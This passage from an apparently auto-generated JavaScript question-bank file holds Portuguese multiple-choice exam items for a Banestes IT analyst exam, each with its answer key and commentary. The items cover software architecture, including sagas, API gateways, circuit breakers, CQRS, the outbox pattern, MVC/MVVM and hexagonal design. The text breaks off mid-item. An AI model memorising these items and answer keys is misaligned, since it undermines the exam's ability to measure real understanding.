/*
 * Variações (esp-b) — agente 4: Arquitetura, DevOps, SO, Redes, Serviços, Segurança e Nuvem.
 * Gerado por tools/verificacao/agente4/gerar.py a partir de dados_*.py (não editar à mão).
 * Cada BANCO.push recebe um objeto JSON válido (chaves entre aspas) — ver docs/esquema.md.
 */
window.BANCO = window.BANCO || [];

BANCO.push({
  "id": "ESP-ARQ-V001",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços: Saga",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Simulado FCC 1 – Q11",
    "id_pai": "ESP-ARQ-0001",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em uma cooperativa de crédito, a contratação de um consórcio envolve os microsserviços Propostas, Cobrança e Notificações, cada um com seu próprio banco de dados. Um componente central recebe o pedido, manda cada serviço executar sua transação local na ordem definida e, se a Cobrança falhar, comanda as transações de compensação nos serviços que já concluíram suas etapas. Essa solução corresponde a uma",
  "imagem": null,
  "alternativas": {
    "A": "saga orquestrada.",
    "B": "saga coreografada.",
    "C": "transação distribuída com commit em duas fases (2PC).",
    "D": "implementação do padrão CQRS com Event Sourcing.",
    "E": "aplicação do padrão Bulkhead com fallback."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** Na saga **orquestrada** um orquestrador central diz a cada serviço o que fazer e dispara as compensações em caso de falha.\n\n(B) Na saga coreografada não há coordenador: cada serviço publica eventos e reage aos eventos dos outros. (C) O 2PC é um protocolo bloqueante com coordenador de transação global, justamente o que a saga evita; não usa compensações. (D) CQRS separa os modelos de leitura e escrita e Event Sourcing guarda a sequência de eventos; nenhum dos dois coordena a transação de negócio. (E) Bulkhead isola recursos por dependência e fallback dá resposta alternativa; não tratam consistência entre serviços.\n\nRevisar: Apostila 06, §11.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V002",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Padrões de projeto GoF, MVC e arquitetura em camadas",
  "ref_apostila": {
    "modulo": "06",
    "secao": "9",
    "titulo": "Padrões de projeto GoF, MVC e arquitetura em camadas",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#9. Padrões de projeto GoF, MVC e arquitetura em camadas]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §9 – Q4",
    "id_pai": "ESP-ARQ-0002",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Considere uma aplicação web de consulta de investimentos construída segundo o padrão MVC. O componente que concentra os dados e as regras de negócio (por exemplo, o cálculo da rentabilidade líquida de um CDB) e que, no MVC clássico, notifica as visões quando seu estado muda é o",
  "imagem": null,
  "alternativas": {
    "A": "Controller.",
    "B": "View.",
    "C": "Model.",
    "D": "Front Controller.",
    "E": "Presenter."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** O **Model** guarda os dados, as regras de negócio e o estado; no MVC clássico notifica as views (padrão Observer).\n\n(A) O Controller recebe as entradas do usuário, aciona o modelo e escolhe a view. (B) A View apenas apresenta os dados. (D) Front Controller é um ponto único que recebe todas as requisições e as despacha (ex.: DispatcherServlet); não contém regra de negócio. (E) Presenter é o mediador do padrão MVP, não um componente do MVC.\n\nRevisar: Apostila 06, §9.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V003",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Padrões de projeto GoF, MVC e arquitetura em camadas",
  "ref_apostila": {
    "modulo": "06",
    "secao": "9",
    "titulo": "Padrões de projeto GoF, MVC e arquitetura em camadas",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#9. Padrões de projeto GoF, MVC e arquitetura em camadas]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §9 – Q4",
    "id_pai": "ESP-ARQ-0002",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um aplicativo cuja interface se liga, por *data binding*, a um componente que expõe propriedades e comandos, sem que a tela precise conhecer o modelo de domínio nem ser atualizada manualmente pelo código, adota-se o padrão",
  "imagem": null,
  "alternativas": {
    "A": "MVC clássico, com a View observando diretamente o Model.",
    "B": "MVP, com a View passiva atualizada pelo Presenter.",
    "C": "Front Controller, com despacho centralizado de requisições.",
    "D": "MVVM, com a View ligada à ViewModel por data binding.",
    "E": "Arquitetura em camadas fechada, com a apresentação acessando só o negócio."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** No **MVVM** a ViewModel expõe dados e comandos aos quais a View se liga por **data binding** (WPF, Angular, Vue).\n\n(A) No MVC clássico a View consulta o Model e é notificada por Observer; não há ViewModel. (B) No MVP a View é passiva e o Presenter a atualiza explicitamente, sem data binding. (C) Front Controller trata do recebimento de requisições, não da ligação de dados com a tela. (E) Camadas fechadas descrevem dependências entre camadas, não o mecanismo de atualização da interface.\n\nRevisar: Apostila 06, §9.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V004",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Padrões de projeto GoF, MVC e arquitetura em camadas",
  "ref_apostila": {
    "modulo": "06",
    "secao": "9",
    "titulo": "Padrões de projeto GoF, MVC e arquitetura em camadas",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#9. Padrões de projeto GoF, MVC e arquitetura em camadas]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §9 – Q6",
    "id_pai": "ESP-ARQ-0003",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre arquiteturas em camadas, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "Em camadas abertas (relaxadas), cada camada só pode acessar a camada imediatamente inferior, o que maximiza o isolamento.",
    "B": "Uma aplicação organizada em três camadas lógicas (layers) obrigatoriamente é implantada em três máquinas distintas (tiers).",
    "C": "Na arquitetura cliente-servidor em duas camadas físicas, o cliente costuma conter a interface e boa parte da lógica, acessando diretamente o servidor de banco de dados.",
    "D": "O antipadrão sinkhole ocorre quando a camada de apresentação acessa diretamente o banco de dados, sem passar pelo negócio.",
    "E": "Trocar o SGBD exige alterar todas as camadas, pois a camada de dados não isola a persistência."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** No modelo **2 tier** (cliente gordo + SGBD), a aplicação cliente reúne interface e lógica e fala direto com o servidor de banco.\n\n(A) Descreve as camadas **fechadas** (estritas); nas abertas uma camada pode acessar qualquer inferior. (B) Layer é divisão lógica e tier é física: três layers podem rodar em um único tier. (D) Sinkhole é a camada que apenas repassa chamadas sem acrescentar lógica; acesso direto da apresentação ao banco é violação de camadas fechadas. (E) Isolar a persistência na camada de dados é justamente o que permite trocar o banco sem mexer nas outras camadas.\n\nRevisar: Apostila 06, §9.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V005",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §11 – Q1",
    "id_pai": "ESP-ARQ-0004",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um banco mantém um aplicativo móvel, um internet banking web e uma API para parceiros. Cada canal precisa de respostas com formatos e agregações diferentes, e a equipe decide criar um gateway específico para cada tipo de cliente, moldado às necessidades de cada front-end. Esse padrão é denominado",
  "imagem": null,
  "alternativas": {
    "A": "Service Mesh.",
    "B": "Backend for Frontend (BFF).",
    "C": "Enterprise Service Bus (ESB).",
    "D": "Sidecar.",
    "E": "Strangler Fig."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** O **BFF** é uma variação do API Gateway com um gateway por tipo de cliente (mobile, web, parceiros).\n\n(A) Service mesh cuida da comunicação **interna** serviço a serviço (mTLS, retries, observabilidade). (C) O ESB é o barramento de integração centralizado típico da SOA, não um gateway por canal. (D) Sidecar é um contêiner auxiliar implantado junto a cada serviço. (E) Strangler Fig é padrão de migração gradual de legado.\n\nRevisar: Apostila 06, §11.6.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V006",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §11 – Q1",
    "id_pai": "ESP-ARQ-0004",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Considere as atribuições a seguir em uma arquitetura de microsserviços. NÃO é função recomendada para um API Gateway:",
  "imagem": null,
  "alternativas": {
    "A": "rotear cada requisição externa ao serviço responsável.",
    "B": "validar tokens OAuth 2.0 de forma centralizada antes de repassar as chamadas.",
    "C": "aplicar limitação de taxa (rate limiting) e cotas por cliente.",
    "D": "agregar respostas de vários serviços em uma única resposta ao cliente.",
    "E": "concentrar as regras de negócio dos serviços para evitar duplicação de código entre eles."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Acumular lógica de negócio no gateway é um risco apontado na literatura: ele deve rotear, proteger e agregar, mas as regras ficam nos serviços (\"endpoints inteligentes, canais burros\").\n\n(A), (B), (C) e (D) são funções típicas do API Gateway: roteamento, autenticação/autorização centralizadas, rate limiting e composição de respostas.\n\nRevisar: Apostila 06, §11.6.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V007",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §11 – Q2",
    "id_pai": "ESP-ARQ-0005",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Segundo as características dos microsserviços descritas por James Lewis e Martin Fowler, é INCORRETO afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "Os componentes são serviços executados em processos próprios, e não bibliotecas ligadas em memória.",
    "B": "Os times são organizados em torno de capacidades de negócio, e não por camada técnica.",
    "C": "A lógica fica nos serviços e a comunicação usa canais simples, como HTTP ou mensageria leve.",
    "D": "A governança é centralizada, com uma única stack tecnológica obrigatória e um banco de dados corporativo compartilhado.",
    "E": "Os serviços são projetados para falhas, exigindo monitoramento e recuperação rápida."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Lewis e Fowler descrevem **governança descentralizada** (cada time escolhe ferramentas) e **gerenciamento de dados descentralizado** (banco por serviço, persistência poliglota).\n\n(A) Componentização via serviços. (B) Organização em torno de capacidades de negócio (Lei de Conway). (C) Smart endpoints and dumb pipes. (E) Design for failure. Todas estão corretas.\n\nRevisar: Apostila 06, §11.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V008",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §11 – Q3",
    "id_pai": "ESP-ARQ-0006",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um circuit breaker protege as chamadas do serviço de Pix ao serviço de Antifraude. Depois de várias falhas seguidas, o circuito abriu; passado o tempo de espera configurado, o disjuntor deixa passar algumas chamadas de teste para verificar se o Antifraude se recuperou. Nesse momento, o circuit breaker está no estado",
  "imagem": null,
  "alternativas": {
    "A": "fechado.",
    "B": "aberto.",
    "C": "semiaberto (half-open).",
    "D": "degradado (fallback).",
    "E": "isolado (bulkhead)."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** No estado **semiaberto** (half-open) algumas chamadas de teste passam; se derem certo, o circuito fecha; se falharem, volta a abrir.\n\n(A) Fechado é o funcionamento normal, com todas as chamadas passando. (B) Aberto bloqueia as chamadas e falha imediatamente. (D) Fallback é a resposta alternativa usada quando a chamada falha, não um estado do disjuntor. (E) Bulkhead é outro padrão (isolamento de recursos).\n\nRevisar: Apostila 06, §11.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V009",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §11 – Q3",
    "id_pai": "ESP-ARQ-0006",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No serviço de Internet Banking, as chamadas ao serviço de Câmbio, que anda lento, passaram a consumir todas as threads do pool HTTP, derrubando também as consultas de saldo. A solução foi reservar pools de threads e conexões separados para cada dependência, de modo que a lentidão de uma não esgote os recursos das outras. Trata-se do padrão",
  "imagem": null,
  "alternativas": {
    "A": "Retry com backoff exponencial.",
    "B": "Circuit Breaker.",
    "C": "Saga.",
    "D": "API Composition.",
    "E": "Bulkhead (antepara)."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** O **Bulkhead** isola recursos (pools de threads/conexões) por dependência, como os compartimentos estanques de um navio.\n\n(A) Retry repete chamadas que falharam por motivo transitório; aqui pioraria o esgotamento. (B) O circuit breaker para de chamar o serviço após falhas, mas não reserva recursos separados. (C) Saga trata consistência de transações distribuídas. (D) API Composition junta resultados de vários serviços.\n\nRevisar: Apostila 06, §11.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V010",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §11 – Q4",
    "id_pai": "ESP-ARQ-0007",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "O serviço de Extratos recebe milhares de consultas por segundo, enquanto as gravações de lançamentos são bem menos frequentes e exigem validações complexas. A equipe decidiu manter um modelo de escrita para os comandos e um modelo de leitura desnormalizado, em banco separado e otimizado para consultas, atualizado a partir dos eventos de escrita. Esse padrão é o",
  "imagem": null,
  "alternativas": {
    "A": "CQRS.",
    "B": "Saga.",
    "C": "Database per service.",
    "D": "Strangler Fig.",
    "E": "Service Discovery."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** O **CQRS** (Command Query Responsibility Segregation) separa o modelo de escrita (comandos) do de leitura (consultas), que podem ter bancos e estruturas diferentes.\n\n(B) Saga coordena transações locais com compensações. (C) Database per service define que cada serviço tem seu banco, mas não separa leitura de escrita dentro do serviço. (D) Strangler Fig migra legados aos poucos. (E) Service Discovery localiza instâncias de serviços.\n\nRevisar: Apostila 06, §11.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V011",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Microsserviços",
  "ref_apostila": {
    "modulo": "06",
    "secao": "11",
    "titulo": "Microsserviços",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#11. Microsserviços]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §11 – Q4",
    "id_pai": "ESP-ARQ-0007",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Ao registrar uma transferência, o serviço de Contas grava o lançamento no seu banco e publica o evento *TransferenciaRealizada* no broker. Em uma queda entre as duas operações, o lançamento foi gravado, mas o evento nunca foi publicado. Para garantir a consistência entre banco e mensageria, sem transação distribuída, o padrão indicado é",
  "imagem": null,
  "alternativas": {
    "A": "aplicar um circuit breaker na chamada ao banco de dados.",
    "B": "usar commit em duas fases entre o banco de dados e o broker de mensagens.",
    "C": "aumentar o timeout da publicação no broker para evitar a perda do evento.",
    "D": "substituir a mensageria por chamadas síncronas REST a todos os serviços interessados.",
    "E": "gravar o evento em uma tabela de saída na mesma transação local do lançamento e publicá-lo depois por um processo separado (outbox transacional)."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** No **outbox transacional**, o evento é gravado numa tabela \"outbox\" na **mesma transação local** do dado; um processo separado o publica, garantindo que dado e evento fiquem consistentes.\n\n(B) O 2PC é bloqueante, pouco escalável e muitas vezes não suportado pelo broker; é o que se quer evitar. (C) Timeout maior não resolve a queda entre as duas operações. (D) Chamadas síncronas aumentam o acoplamento temporal e não resolvem a atomicidade. (A) Circuit breaker evita falhas em cascata; não garante atomicidade.\n\nRevisar: Apostila 06, §11.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V012",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA…",
  "ref_apostila": {
    "modulo": "06",
    "secao": "18",
    "titulo": "Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA no desenvolvimento",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#18. Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA no desenvolvimento]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §11 – Q5",
    "id_pai": "ESP-ARQ-0008",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um banco está criando um novo serviço de Cadastro que precisa consultar o sistema legado de clientes em mainframe, cujo modelo usa códigos e estruturas de registro antigos. Para que esses conceitos não \"contaminem\" o modelo de domínio do novo serviço, cria-se um componente tradutor entre os dois modelos. No vocabulário do DDD, esse componente é a",
  "imagem": null,
  "alternativas": {
    "A": "camada anticorrupção (anti-corruption layer).",
    "B": "figueira estranguladora (strangler fig).",
    "C": "linguagem ubíqua (ubiquitous language).",
    "D": "raiz de agregado (aggregate root).",
    "E": "relação conformista (conformist)."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** A **camada anticorrupção** traduz entre o modelo do legado e o modelo novo, protegendo o domínio novo.\n\n(B) Strangler Fig substitui o legado aos poucos, roteando funções para o sistema novo; não é um tradutor de modelos. (C) Linguagem ubíqua é o vocabulário comum dentro de um contexto delimitado. (D) Raiz de agregado é a entidade que controla o acesso a um agregado. (E) Na relação conformista o consumidor **adota** o modelo do fornecedor, o oposto do que se quer.\n\nRevisar: Apostila 06, §18.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V013",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA…",
  "ref_apostila": {
    "modulo": "06",
    "secao": "18",
    "titulo": "Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA no desenvolvimento",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#18. Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA no desenvolvimento]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §18 – Q1",
    "id_pai": "ESP-ARQ-0009",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Na arquitetura hexagonal (portas e adaptadores) de um serviço de empréstimos, considere os componentes: (1) controlador REST que recebe pedidos de simulação; (2) consumidor de uma fila de propostas; (3) repositório que grava contratos no PostgreSQL; (4) cliente HTTP que consulta o birô de crédito. São adaptadores secundários (de saída, *driven*), acionados pelo núcleo da aplicação, apenas",
  "imagem": null,
  "alternativas": {
    "A": "1 e 2.",
    "B": "1 e 3.",
    "C": "2 e 4.",
    "D": "3 e 4.",
    "E": "1, 2 e 4."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Adaptadores **secundários (driven)** são aqueles que o núcleo chama: repositório de banco (3) e cliente de API externa (4).\n\n(1) O controlador REST e (2) o consumidor de fila **chamam** o núcleo: são adaptadores **primários (driving)**. Por isso as combinações que incluem 1 ou 2 estão erradas.\n\nRevisar: Apostila 06, §18.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V014",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA…",
  "ref_apostila": {
    "modulo": "06",
    "secao": "18",
    "titulo": "Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA no desenvolvimento",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#18. Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA no desenvolvimento]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §18 – Q1",
    "id_pai": "ESP-ARQ-0009",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre a arquitetura hexagonal e as arquiteturas Onion e Clean Architecture, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "o domínio depende diretamente das classes do framework web e do driver do banco de dados.",
    "B": "a hexagonal proíbe o uso de bancos relacionais, admitindo apenas mensageria.",
    "C": "a camada de persistência fica no centro, e as regras de negócio a envolvem.",
    "D": "o teste do domínio exige subir banco de dados e servidor web reais, pois não há como substituir adaptadores.",
    "E": "as dependências apontam para o domínio, que define portas implementadas por adaptadores de cada tecnologia."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Em todas essas arquiteturas o **domínio fica no centro** e **as dependências apontam para dentro** (aplicação do princípio da inversão de dependência); o domínio define portas e os adaptadores as implementam.\n\n(A) O domínio não conhece framework nem banco. (C) Quem fica no centro é o domínio, não a persistência. (D) Um dos benefícios é testar o domínio com adaptadores falsos. (B) Não há restrição de tecnologia: o banco relacional entra por um adaptador.\n\nRevisar: Apostila 06, §18.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V015",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA…",
  "ref_apostila": {
    "modulo": "06",
    "secao": "18",
    "titulo": "Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA no desenvolvimento",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#18. Arquitetura e práticas complementares: hexagonal, legados, versionamento semântico, IA no desenvolvimento]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §18 – Q3",
    "id_pai": "ESP-ARQ-0010",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma instituição decidiu modernizar seu sistema monolítico de cobrança. Um roteador passou a receber todas as requisições; a cada sprint, uma funcionalidade é reescrita como serviço novo e o roteador desvia o tráfego correspondente para ele, até que o monolito não atenda mais nada e possa ser desligado. A estratégia adotada é a",
  "imagem": null,
  "alternativas": {
    "A": "big bang, com substituição integral em uma única implantação.",
    "B": "lift and shift, movendo o monolito para máquinas virtuais em nuvem.",
    "C": "figueira estranguladora (Strangler Fig).",
    "D": "camada anticorrupção, traduzindo os modelos do legado.",
    "E": "implantação blue-green, alternando entre dois ambientes completos."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** O **Strangler Fig** substitui o legado **gradualmente**, desviando o tráfego para o código novo até o legado poder ser desligado.\n\n(A) Big bang é o oposto: troca tudo de uma vez. (B) Lift and shift (rehost) move a aplicação sem reescrevê-la. (D) A camada anticorrupção traduz modelos, mas não é a estratégia de substituição incremental. (E) Blue-green é estratégia de implantação de versões, não de migração de legado.\n\nRevisar: Apostila 06, §18.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-ARQ-V016",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Arquitetura de sistemas",
  "topico": "Padrões de projeto GoF, MVC e arquitetura em camadas",
  "ref_apostila": {
    "modulo": "06",
    "secao": "9",
    "titulo": "Padrões de projeto GoF, MVC e arquitetura em camadas",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#9. Padrões de projeto GoF, MVC e arquitetura em camadas]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §9.8",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
